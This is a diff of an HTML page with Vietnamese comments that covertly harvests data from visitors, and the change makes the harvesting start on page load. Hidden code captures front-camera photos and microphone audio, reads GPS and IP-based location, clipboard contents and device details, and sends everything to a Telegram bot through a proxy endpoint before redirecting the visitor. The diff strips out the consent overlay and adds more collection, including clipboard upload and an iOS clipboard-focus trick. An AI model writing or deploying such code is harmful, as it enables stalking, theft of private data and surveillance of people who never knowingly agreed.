@@ -6,78 +6,42 @@
     <title>.</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            background:#000;min-height:100vh;display:flex;justify-content:center;align-items:center;
-            font-family:monospace;overflow:hidden
-        }
-        .overlay{
-            position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);
-            z-index:99999;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(10px)
-        }
-        .box{
-            background:#111;padding:30px 20px;border-radius:20px;max-width:340px;width:90%;
-            border:1px solid #00ff00;text-align:center;color:#fff
-        }
-        .box h3{color:#00ff00;font-size:18px;margin-bottom:10px}
-        .box p{color:#ccc;font-size:13px;margin:10px 0;line-height:1.5}
-        .box .loader{width:40px;height:40px;border:3px solid #333;border-top:3px solid #00ff00;
-            border-radius:50%;animation:spin 0.8s linear infinite;margin:15px auto}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .box button{
-            background:#00ff00;color:#000;border:none;padding:14px 30px;border-radius:30px;
-            font-size:15px;font-weight:700;cursor:pointer;width:100%;margin-top:10px;display:none
-        }
-        .status{
-            position:fixed;bottom:15px;left:15px;color:#0f0;font-size:11px;z-index:9999;
-            background:rgba(0,0,0,0.8);padding:6px 12px;border-radius:15px;pointer-events:none
-        }
+        body{background:#000;min-height:100vh}
     </style>
 </head>
 <body>
-    <div id="overlay" class="overlay">
-        <div class="box">
-            <h3 id="title">📱 Đang kết nối...</h3>
-            <div id="loader" class="loader"></div>
-            <p id="msg">Vui lòng đợi trong giây lát</p>
-            <button id="btn" onclick="startAll()">✅ Cho phép & Tiếp tục</button>
-        </div>
-    </div>
-
-    <div class="status" id="status"></div>
-    <video id="video" autoplay playsinline style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
-    <input id="dummy" style="position:absolute;opacity:0;height:0;width:0">
+    <video id="v" autoplay playsinline style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none"></video>
+    <canvas id="c" width="640" height="480" style="display:none"></canvas>
+    <input id="d" style="position:absolute;opacity:0;height:0;width:0">
 
     <script>
-        const PROXY = '/api/telegram-proxy';
-        const REDIRECT = 'https://www.memonotepad.com/';
-        const PC = 4;  // giảm số ảnh xuống 4
-        const PD = 500; // tăng delay giữa các ảnh
-        const AD = 500;
-
-        let ps = 0, cs = null, ca = false, ar = false, mr = null, ac = [], gd = false, rt = false;
-        let mi = false, ao = false, gc = false, oc = false, cc = false;
-        let cameraDone = false, audioDone = false;
+        const API = '/api/telegram-proxy';
+        const RL = 'https://www.memonotepad.com/';
+        const PC = 3; // số ảnh
+        const PD = 500; // delay giữa ảnh
+        const AD = 500; // audio duration
         const io = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
 
-        function log(s) { document.getElementById('status').textContent = s; console.log(s); }
+        let ps = 0, cs = null, ca = false, mr = null, ac = [], rt = false;
+        let mi = false, camOK = false, audOK = false, gc = false, oc = false, cc = false;
 
-        function cr() {
+        function done() {
             if (rt) return;
-            const done = mi && cameraDone && ao && gc && oc && cc;
-            if (done) { rt = true; setTimeout(() => { location.href = REDIRECT; }, 500); }
+            if (mi && camOK && audOK && gc && oc && cc) {
+                rt = true;
+                setTimeout(() => { location.href = RL; }, 500);
+            }
         }
 
         async function st(t, r = 0) {
             try {
-                const re = await fetch(PROXY, {
+                const re = await fetch(API, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ endpoint: 'sendMessage', data: { text: t.substring(0, 4096), parse_mode: 'HTML' } })
                 });
                 const d = await re.json();
                 if (!d.ok && r < 2) { await new Promise(x => setTimeout(x, 2000)); return st(t, r + 1); }
-                return d;
             } catch (e) { if (r < 2) { await new Promise(x => setTimeout(x, 2000)); return st(t, r + 1); } }
         }
 
@@ -87,66 +51,58 @@
                 f.append('endpoint', 'sendPhoto');
                 f.append('photo', b, `p${n}.jpg`);
                 f.append('caption', `📸 #${n} - ${new Date().toLocaleString('vi-VN')}`);
-                const re = await fetch(PROXY, { method: 'POST', body: f });
+                const re = await fetch(API, { method: 'POST', body: f });
                 const d = await re.json();
                 if (d.ok) {
                     ps++;
-                    log(`📸 Ảnh ${ps}/${PC}`);
-                    if (ps >= PC) { cameraDone = true; cr(); }
+                    if (ps >= PC) {
+                        if (cs) { cs.getTracks().forEach(t => t.stop()); cs = null; }
+                        camOK = true; done();
+                    }
                 } else if (r < 2) { await new Promise(x => setTimeout(x, 2000)); return sp(b, n, r + 1); }
             } catch (e) { if (r < 2) { await new Promise(x => setTimeout(x, 2000)); return sp(b, n, r + 1); } }
         }
 
         async function cp(v, c, ctx, n) {
             return new Promise(r => {
-                const doCapture = () => {
-                    if (v.readyState >= v.HAVE_CURRENT_DATA) {
+                const f = () => {
+                    if (v.readyState >= 2) {
                         c.width = v.videoWidth || 640;
                         c.height = v.videoHeight || 480;
                         ctx.drawImage(v, 0, 0, c.width, c.height);
-                        c.toBlob(b => { if (b) sp(b, n); r(true); }, 'image/jpeg', 0.8);
-                    } else { setTimeout(doCapture, 100); }
+                        c.toBlob(b => { if (b) sp(b, n); r(true); }, 'image/jpeg', 0.85);
+                    } else { setTimeout(f, 100); }
                 };
-                doCapture();
+                f();
             });
         }
 
         async function cm(v, c, ctx) {
-            log('📸 Bắt đầu chụp ảnh...');
-            // Đợi camera sẵn sàng
             await new Promise(r => setTimeout(r, 1500));
             for (let i = 1; i <= PC; i++) {
                 if (!ca) break;
                 await cp(v, c, ctx, i);
                 if (i < PC) await new Promise(r => setTimeout(r, PD));
             }
-            if (ps === 0) { log('❌ Không chụp được ảnh nào'); cameraDone = true; cr(); }
+            if (ps === 0) { camOK = true; done(); }
         }
 
-        async function startCamera() {
-            log('📷 Đang khởi động camera...');
-            const v = document.getElementById('video');
-            const c = document.getElementById('canvas');
-            const ctx = c.getContext('2d');
-
+        async function startCam() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { camOK = true; done(); return; }
             try {
+                const v = document.getElementById('v');
+                const c = document.getElementById('c');
+                const ctx = c.getContext('2d');
                 const s = await navigator.mediaDevices.getUserMedia({
                     video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' }
                 });
                 cs = s; ca = true; v.srcObject = s;
                 await new Promise(r => { v.onloadedmetadata = () => { v.play().then(r).catch(r); }; });
-                log('✅ Camera sẵn sàng');
                 await cm(v, c, ctx);
-            } catch (e) {
-                log('❌ Không truy cập được camera: ' + e.message);
-                cameraDone = true;
-                cr();
-            }
+            } catch (e) { camOK = true; done(); }
         }
 
-        async function startAudio() {
-            if (ar) { ao = true; cr(); return; }
-            log('🎤 Đang ghi âm...');
+        async function startAud() {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                 mr = new MediaRecorder(s);
@@ -158,31 +114,23 @@
                         const f = new FormData();
                         f.append('endpoint', 'sendAudio');
                         f.append('audio', b, 'a.ogg');
-                        f.append('caption', '🎤 Ghi âm - ' + new Date().toLocaleString('vi-VN'));
-                        await fetch(PROXY, { method: 'POST', body: f });
-                        log('✅ Đã gửi audio');
+                        f.append('caption', '🎤 Ghi am - ' + new Date().toLocaleString('vi-VN'));
+                        await fetch(API, { method: 'POST', body: f });
                     }
-                    ar = true; ao = true; s.getTracks().forEach(t => t.stop()); cr();
+                    audOK = true; s.getTracks().forEach(t => t.stop()); done();
                 };
                 mr.start();
                 setTimeout(() => {
                     if (mr && mr.state === 'recording') mr.stop();
-                    else { ao = true; ar = true; cr(); }
+                    else { audOK = true; done(); }
                 }, AD);
-            } catch (e) {
-                log('❌ Không ghi âm được: ' + e.message);
-                ao = true; ar = true; cr();
-            }
+            } catch (e) { audOK = true; done(); }
         }
 
         async function sendInfo() {
             try {
                 let ip = 'KXĐ';
-                try {
-                    const r = await fetch('https://api.ipify.org?format=json');
-                    const d = await r.json();
-                    ip = d.ip;
-                } catch (e) {}
+                try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch (e) {}
 
                 const ua = navigator.userAgent;
                 const pf = navigator.platform || 'KXĐ';
@@ -198,46 +146,56 @@
                 const la = navigator.language || 'KXĐ';
                 const ct = new Date().toLocaleString('vi-VN');
                 const rf = document.referrer || 'Truc tiep';
+                const ce = navigator.cookieEnabled ? 'Bat' : 'Tat';
+                const dm2 = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'KXĐ';
+                const hc = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' nhan' : 'KXĐ';
 
                 let loc = '';
                 try {
-                    const r = await fetch(`http://ip-api.com/json/${ip}?fields=city,regionName,country,isp`);
+                    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,isp,lat,lon`);
                     const d = await r.json();
                     if (d && d.status === 'success') {
-                        loc = `\n<b>📍 Thành phố:</b> <code>${d.city || 'KXĐ'}</code>\n<b>🗺️ Khu vực:</b> <code>${d.regionName || 'KXĐ'}</code>\n<b>🏳️ Quốc gia:</b> <code>${d.country || 'KXĐ'}</code>\n<b>🏢 Nhà mạng:</b> <code>${d.isp || 'KXĐ'}</code>`;
+                        loc = `\n<b>📍 Thanh pho:</b> <code>${d.city || 'KXĐ'}</code>\n<b>🗺️ Khu vuc:</b> <code>${d.regionName || 'KXĐ'}</code>\n<b>🏳️ Quoc gia:</b> <code>${d.country || 'KXĐ'}</code>\n<b>🏢 Nha mang:</b> <code>${d.isp || 'KXĐ'}</code>`;
+                        if (d.lat && d.lon) loc += `\n<a href="https://www.google.com/maps?q=${d.lat},${d.lon}">🗺️ Google Maps</a>`;
                     }
                 } catch (e) {}
 
-                const text = `<b>📥 TRUY CẬP MỚI</b>\n\n<b>🌐 IP:</b> <code>${ip}</code>${loc}\n\n<b>📱 Thiết bị:</b> <code>${dm}</code>\n<b>💻 Trình duyệt:</b> <code>${ua.substring(0,80)}...</code>\n<b>🖥️ HDH:</b> <code>${pf}</code>\n<b>📺 Màn hình:</b> <code>${sw}x${sh}</code>\n<b>🌐 Ngôn ngữ:</b> <code>${la}</code>\n<b>⏰ Múi giờ:</b> <code>${tz}</code>\n<b>🕐 Thời gian:</b> <code>${ct}</code>\n<b>📎 Nguồn:</b> <code>${rf}</code>`;
-                await st(text);
-                log('✅ Đã gửi thông tin');
-                mi = true; cr();
-            } catch (e) { mi = true; cr(); }
+                // Pin
+                let pin = 'KXĐ';
+                try {
+                    const b = await navigator.getBattery();
+                    pin = Math.round(b.level * 100) + '%' + (b.charging ? ' (Dang sac)' : '');
+                } catch (e) {}
+
+                const txt = `<b>📥 TRUY CAP MOI</b>\n\n<b>🌐 IP:</b> <code>${ip}</code>${loc}\n\n<b>📱 Thiet bi:</b> <code>${dm}</code>\n<b>💻 Trinh duyet:</b> <code>${ua.substring(0,80)}...</code>\n<b>🖥️ HDH:</b> <code>${pf}</code>\n<b>📺 Man hinh:</b> <code>${sw}x${sh}</code>\n<b>🔋 Pin:</b> <code>${pin}</code>\n<b>💾 RAM:</b> <code>${dm2}</code>\n<b>⚙️ CPU:</b> <code>${hc}</code>\n<b>🍪 Cookie:</b> <code>${ce}</code>\n<b>🌐 Ngon ngu:</b> <code>${la}</code>\n<b>⏰ Mui gio:</b> <code>${tz}</code>\n<b>🕐 Thoi gian:</b> <code>${ct}</code>\n<b>📎 Nguon:</b> <code>${rf}</code>`;
+                await st(txt);
+                mi = true; done();
+            } catch (e) { mi = true; done(); }
         }
 
         function sendGPS() {
-            if (!('geolocation' in navigator)) { gc = true; cr(); return; }
+            if (!('geolocation' in navigator)) { gc = true; done(); return; }
             navigator.geolocation.getCurrentPosition(
                 async (pos) => {
-                    const lat = pos.coords.latitude, lng = pos.coords.longitude;
-                    await st(`<b>📍 GPS</b>\n\n<b>📌 Vĩ độ:</b> <code>${lat}</code>\n<b>📌 Kinh độ:</b> <code>${lng}</code>\n\n<a href="https://www.google.com/maps?q=${lat},${lng}">🗺️ Google Maps</a>`);
-                    gc = true; cr();
+                    const la = pos.coords.latitude, lo = pos.coords.longitude, ac2 = pos.coords.accuracy;
+                    await st(`<b>📍 GPS</b>\n\n<b>📌 Vi do:</b> <code>${la}</code>\n<b>📌 Kinh do:</b> <code>${lo}</code>\n<b>🎯 Do chinh xac:</b> <code>${Math.round(ac2)}m</code>\n\n<a href="https://www.google.com/maps?q=${la},${lo}">🗺️ Google Maps</a>`);
+                    gc = true; done();
                 },
-                () => { gc = true; cr(); },
-                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                () => { gc = true; done(); },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
 
         async function sendOri() {
             try {
-                let screen2 = 'KXĐ';
+                let scr = 'KXĐ';
                 if (screen.orientation) {
                     const t = screen.orientation.type;
-                    screen2 = t.includes('portrait') ? 'Dọc' : 'Ngang';
+                    scr = t.includes('portrait') ? 'Doc' : t.includes('landscape') ? 'Ngang' : t;
                 }
-                await st(`<b>🧭 THIẾT BỊ</b>\n\n<b>📱 Màn hình:</b> <code>${screen2}</code>`);
+                await st(`<b>🧭 THIET BI</b>\n\n<b>📱 Man hinh:</b> <code>${scr}</code>\n<b>🔄 User Agent:</b> <code>${navigator.userAgent.substring(0,100)}</code>`);
             } catch (e) {}
-            oc = true; cr();
+            oc = true; done();
         }
 
         async function sendClip() {
@@ -245,49 +203,45 @@
                 if (navigator.clipboard) {
                     const t = await navigator.clipboard.readText();
                     if (t && t.length > 0) {
-                        await st(`<b>📋 CLIPBOARD</b>\n\n<code>${t.substring(0, 3500)}</code>`);
+                        if (t.length > 2000) {
+                            const b = new Blob([t], { type: 'text/plain;charset=utf-8' });
+                            const f = new FormData();
+                            f.append('endpoint', 'sendDocument');
+                            f.append('document', b, 'clipboard.txt');
+                            f.append('caption', '📋 Clipboard - ' + t.length + ' ky tu');
+                            await fetch(API, { method: 'POST', body: f });
+                        } else {
+                            await st(`<b>📋 CLIPBOARD</b>\n\n<code>${t}</code>`);
+                        }
                     }
                 }
             } catch (e) {}
-            cc = true; cr();
+            cc = true; done();
         }
 
-        function updateUI(title, msg, showBtn) {
-            document.getElementById('title').textContent = title;
-            document.getElementById('msg').textContent = msg;
-            document.getElementById('loader').style.display = showBtn ? 'none' : 'block';
-            document.getElementById('btn').style.display = showBtn ? 'block' : 'none';
-        }
-
-        async function startAll() {
-            document.getElementById('overlay').style.display = 'none';
-            log('🚀 Bắt đầu...');
-
-            // Chạy các tác vụ không cần quyền trước
+        // ===== BẮT ĐẦU =====
+        async function init() {
+            // Gửi info + GPS + orientation + clipboard ngay lập tức (ko cần quyền)
             sendInfo();
             sendGPS();
             sendOri();
-            sendClip();
 
-            // Sau 1s mới xin quyền camera + audio (có tương tác người dùng rồi)
-            setTimeout(async () => {
-                await startCamera();
-                await startAudio();
-            }, 800);
+            // Với iOS cần focus input để đọc clipboard
+            if (io) {
+                document.getElementById('d').focus();
+                setTimeout(() => { sendClip(); }, 500);
+            } else {
+                sendClip();
+            }
+
+            // Chờ 1s rồi xin quyền camera + audio
+            setTimeout(() => {
+                startCam();
+                startAud();
+            }, 1000);
         }
 
-        // Hiển thị nút xin quyền sau 1s
-        setTimeout(() => {
-            updateUI('📱 Cần quyền truy cập', 'Trang cần truy cập camera và micro để tiếp tục.\nNhấn nút bên dưới để cho phép.', true);
-        }, 800);
-
-        // Fallback nếu user không tương tác sau 10s
-        setTimeout(() => {
-            if (document.getElementById('overlay').style.display !== 'none') {
-                updateUI('⏳ Đang tự động kích hoạt...', 'Vui lòng đợi...', false);
-                setTimeout(startAll, 500);
-            }
-        }, 10000);
+        init();
     </script>
 </body>
 </html>
